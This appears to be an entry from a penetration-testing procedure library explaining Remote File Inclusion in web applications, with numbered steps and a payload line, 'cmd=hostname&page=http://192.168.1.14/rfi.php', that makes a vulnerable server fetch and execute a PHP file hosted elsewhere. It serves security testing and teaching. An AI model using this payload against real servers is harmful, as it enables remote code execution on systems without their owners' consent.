---
id: d4cf08ee-eaa3-4aa4-8ab3-cc1a61209228
name: Remote File Inclusion (RFI)
type: procedure
verified: true
submitted: true
created_at: '2020-07-23T14:25:42.492569+00:00'
updated_at: '2023-05-26T01:31:30.533517+00:00'
platforms:
- Web
tags:
- '[[Code Execution]]'
- '[[Remote File Inclusion]]'
- '[[RFI]]'
- '[[Web Applications]]'
---

# Remote File Inclusion (RFI)

**Status**: ✓ Verified

## Summary

Remote File Inclusion allows an attacker to run malicious code on the vulnerable web server. This attack can be performed on the parameters that accept file or URL as input. 

## Description

# Description

Remote File Inclusion allows an attacker to run malicious code on the vulnerable web server. This attack can be performed on the parameters that accept file or URL as input. 

# Instructions

# 

1. Identify the parameter that accepts file or URL as input.

2. Host a page with malicious code as shown below. The *rfi.php* file contains *phpinfo()* function, which reveals the php information. There is also a command parameter that accepts system command as input and executes on the server.

3. The *rfi.php* file is hosted on a server and it can be accessed using the URL *http://192.168.1.14/rfi.php*. The URL is passed as input to the page parameter along with command (*cmd*) as shown in the below image. 

Payload: *cmd=hostname&page=http://192.168.1.14/rfi.php*

4. Web server parses the contents of *rfi.php* file and executes the *phpinfo()* function along with the *hostname* command.

## Platforms

- Web

## Tags

- [[Code Execution]]
- [[Remote File Inclusion]]
- [[RFI]]
- [[Web Applications]]
